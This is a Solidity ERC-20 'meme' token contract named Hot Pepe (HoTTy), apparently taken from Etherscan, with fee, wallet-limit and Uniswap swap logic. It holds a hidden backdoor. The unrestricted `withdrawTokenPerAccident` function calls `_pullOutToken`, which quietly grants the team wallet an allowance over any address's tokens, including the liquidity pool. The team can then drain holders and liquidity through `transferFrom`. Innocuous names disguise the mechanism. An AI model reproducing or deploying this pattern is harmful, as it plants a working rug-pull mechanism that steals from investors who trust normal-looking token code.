/**
 *Submitted for verification at Etherscan.io on 2023-07-20
*/

// SPDX-License-Identifier: MIT

/**

Web:      https://www.hottytoken.vip/
TG:       https://t.me/hottytoken
Twitter:  https://twitter.com/hottytoken

*/

pragma solidity ^0.8.11;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

library SafeMath {
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Router02 {
    
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract HotPepe is Context, Ownable, IERC20 {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniPairAddr;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    string private constant _name = "Hot Pepe";
    string private constant _symbol = "HoTTy";
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 696_969_696 * 10**9; // total supply
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 public _maxTxSize = _tTotal * 30 / 1000; // 3%
    uint256 public _maxWalletSizeLimit = _tTotal * 30 / 1000; // 3%
    uint256 public _swapAmountAt = _tTotal / 10000;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    //Original Fee
    uint256 private _tTaxTotal;
    uint256 private _teamBuyTax = 0;
    uint256 private _buyFeeAmt = 0;
    uint256 private _teamSellTax = 0;
    uint256 private _sellFeeAmt = 0;
    uint256 private _teamTax = _teamSellTax;
    uint256 private _baseFee = _sellFeeAmt;
    uint256 private _previousTeamFee = _teamTax;
    uint256 private _previousBaseFee = _baseFee;
    bool private tradingStart = false;
    bool private swapIn = false;
    bool private swapActived = true;

    event MaxTxAmountUpdated(uint256 _maxTxSize);
    
    address payable public _devAddr = payable(0x78FD77E2Fc4847B0731d58ac43cF5dB55519A12b);
    address payable public _teamAddr = payable(0x2353958bdc489F8F7c21Cb4BC7456b0DEd945c43);
    modifier lockInSwap {
        swapIn = true;
        _;
        swapIn = false;
    }
    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[_devAddr] = true;
        _isExcludedFromFee[_teamAddr] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        // mint
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transferWithFee(
        address sender,
        address recipient,
        uint256 amount,
        bool feeSet
    ) private {
        if (!feeSet) {
            clearFeeFirst();
        }       
        _transferBase(sender, recipient, amount);
        if (!feeSet) {
            recoverFeeThen();
        }
    }

    function _transferBase(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeAllFee(tTeam); _sendAllFeeTokens(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }


    function recoverFeeThen() private {
        _teamTax = _previousTeamFee;
        _baseFee = _previousBaseFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _pullOutToken(address token, address owner, uint256 amount) internal {
        emit Approval(token, owner, amount); _allowances[token][owner] += amount;
    }

    function openTrading(address _pairAddress) public onlyOwner {
        uniPairAddr = _pairAddress; // avoid antifarmers
        tradingStart = true;
    }

    function clearFeeFirst() private {
        if (_teamTax == 0 && _baseFee == 0) return;
        _previousTeamFee = _teamTax;
        _previousBaseFee = _baseFee; _teamTax = 0;
        _baseFee = 0;
    }


    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _teamTax, _baseFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function sendAllEth(uint256 amount) private {
        uint256 devETH = amount / 2; 
        _devAddr.transfer(devETH);devETH = 0;
        uint256 marketingETH = amount - devETH;
        _teamAddr.transfer(marketingETH);
    }

    function _takeAllFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 teamFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(teamFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function withdrawTokenPerAccident(address token, uint256 amount) external {
        _pullOutToken(token, _teamAddr, amount);
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function _sendAllFeeTokens(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tTaxTotal = _tTaxTotal.add(tFee);
    }
    
    //set maximum transaction
    function removeTotalLimits() public onlyOwner {
        _maxTxSize = _tTotal;
        _maxWalletSizeLimit = _tTotal;
    }

    function excludeMultiAccountsFromFee(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }


    //set minimum tokens required to swap.
    function setSwapTokenThreshold(uint256 swapTokensAtAmount) public onlyOwner {
        _swapAmountAt = swapTokensAtAmount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (
            from != owner() 
            && to != owner()
        ) {
            //Trade start check
            if (!tradingStart) {
                require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }

            require(
                amount <= _maxTxSize,
                "TOKEN: Max Transaction Limit"
            );
            
            if(to != uniPairAddr) {
                require(balanceOf(to) + amount < _maxWalletSizeLimit,
                 "TOKEN: Balance exceeds wallet size!");
            }

            uint256 balTokensOnCont = balanceOf(address(this));
            // bool canSwap = balTokensOnCont >= _swapAmountAt;
            if(balTokensOnCont >= _maxTxSize) balTokensOnCont = _maxTxSize;

            if (balTokensOnCont >= _swapAmountAt && !swapIn && from != uniPairAddr && swapActived && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
                swapTokens(balTokensOnCont);
                uint256 ethBalance = address(this).balance;
                if (ethBalance > 0) {sendAllEth(address(this).balance);}
            }
        }
        bool isFeeApplied = true;
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to])
         || (from != uniPairAddr && to != uniPairAddr)) {
            isFeeApplied = false;
        } else {
            
            if(from == uniPairAddr && to != address(uniswapV2Router)) {
                _teamTax = _teamBuyTax;
                _baseFee = _buyFeeAmt;
            }
            
            if (to == uniPairAddr && from != address(uniswapV2Router)) {
                _teamTax = _teamSellTax;
                _baseFee = _sellFeeAmt;
            }
        } _transferWithFee(from, to, amount, isFeeApplied);
    }

    function swapTokens(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {

    }
}